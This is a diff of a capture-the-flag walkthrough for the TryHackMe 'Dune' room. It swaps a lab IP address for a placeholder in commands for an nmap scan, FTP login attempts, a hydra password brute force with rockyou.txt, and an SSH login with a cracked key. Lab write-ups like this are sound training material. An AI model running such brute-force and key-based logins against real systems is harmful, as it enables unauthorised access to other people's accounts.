@@ -4,10 +4,10 @@ https://tryhackme.com/room/dune
 Use `nmap` to run a quick port scan to see what services are running on the box:
 
 ```
-$ nmap 10.10.76.115        
+$ nmap <ip-address>        
                            
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-22 19:09 CET
-Nmap scan report for 10.10.76.115
+Nmap scan report for <ip-address>
 Host is up (0.22s latency).
 Not shown: 997 closed ports
 PORT   STATE SERVICE
@@ -65,8 +65,8 @@ We also see that Jessica instruct us (Paul) to find Duncah Idaho, and she gives 
 Before we attempt to brute force our way into FTP, let's check if we can login as `anonymous`.
 
 ```
-$ ftp anonymous@10.10.76.115
-Connected to 10.10.76.115.
+$ ftp anonymous@<ip-address>
+Connected to <ip-address>.
 220 Swordmaster Duncan Idaho's Quarters
 331 Please specify the password.
 Password: 
@@ -78,21 +78,21 @@ ftp: Login failed
 Anonymous login is not enabled, but we learned that the FTP server is "Duncan Idaho's Quarters". Looks like we're in the right place. Let's try using `hydra`` to brute force Duncan's password using the rockyou.txt wordlist:
 
 ```
-$ hydra -l duncan -P /usr/share/wordlists/rockyou.txt 10.10.76.115 ftp -t 64
+$ hydra -l duncan -P /usr/share/wordlists/rockyou.txt <ip-address> ftp -t 64
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-22 19:33:30
 [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
-[DATA] attacking ftp://10.10.76.115:21/
-[21][ftp] host: 10.10.76.115   login: duncan   password: <redacted>
+[DATA] attacking ftp://<ip-address>:21/
+[21][ftp] host: <ip-address>   login: duncan   password: <redacted>
 1 of 1 target successfully completed, 1 valid password found
 ```
 
 Great, we found a password! Let's login to FTP and have a look around.
 
 ```
-$ ftp duncan@10.10.76.115                                                   
-Connected to 10.10.76.115.
+$ ftp duncan@<ip-address>                                                   
+Connected to <ip-address>.
 220 Swordmaster Duncan Idaho's Quarters
 331 Please specify the password.
 Password: duncan
@@ -195,7 +195,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-Got it! Now we can use this passphrase to login as `paul` via SSH: `$ ssh -i id_rsa paul@10.10.76.115`. When we get in, the opening banner message shows a conversation between us (`paul`) and `stilgar` the Fremen. He says that if we are able to ride a desert sandworm, he will let use join the Fremen.
+Got it! Now we can use this passphrase to login as `paul` via SSH: `$ ssh -i id_rsa paul@<ip-address>`. When we get in, the opening banner message shows a conversation between us (`paul`) and `stilgar` the Fremen. He says that if we are able to ride a desert sandworm, he will let use join the Fremen.
 
 ## 7. Pirvilege Escalation
 
